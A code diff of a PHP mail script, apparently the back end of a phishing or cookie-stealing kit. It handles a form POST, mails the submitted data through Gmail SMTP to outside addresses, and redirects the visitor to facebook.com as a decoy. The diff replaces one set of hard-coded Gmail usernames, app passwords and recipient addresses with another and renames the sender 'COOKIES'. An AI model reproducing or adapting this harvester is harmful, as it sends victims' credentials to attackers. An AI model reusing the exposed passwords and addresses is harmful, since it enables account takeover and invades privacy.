@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://in-to-use-in-b.vercel.app/");
+header("Location:https://facebook.com");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -28,16 +28,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'jsjjjaj671@gmail.com'; // Replace with your email address
-        $mail->Password   = 'qaey ostp xfxc fyiw'; // Replace with your email password
+        $mail->Username   = 'tto890534@gmail.com'; // Replace with your email address
+        $mail->Password   = 'jtuc hvxq pcsd ajxg'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('jsjjjaj671@gmail.com', 'PROFESSOR');
-        $mail->addAddress('mahboobalinizamani@gmail.com');
-         $mail->addAddress('rnxsxnnxnx@gmail.com');
+        $mail->setFrom('tto890534@gmail.com', 'COOKIES');
+        $mail->addAddress('Joewilliam9961@gmail.com');
+    
        
 
       // Email recipient's address
